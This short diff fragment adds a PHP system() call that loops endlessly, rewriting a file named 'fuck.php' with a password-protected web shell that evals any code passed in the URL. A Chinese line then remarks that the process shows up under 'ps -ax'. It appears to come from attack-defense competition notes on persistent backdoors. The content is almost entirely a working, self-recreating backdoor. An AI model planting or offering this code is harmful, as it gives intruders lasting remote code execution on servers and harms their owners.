@@ -1,0 +1,4 @@
+system('while true;do echo \'<?php if(md5($_GET[pass])==\"3a50065e1709acc47ba0c9238294364f\"){@eval($_GET[a]);} ?>\' >fuck.php;sleep 0.1;done;');
+
+
+ps -ax 可以查找到该进程。
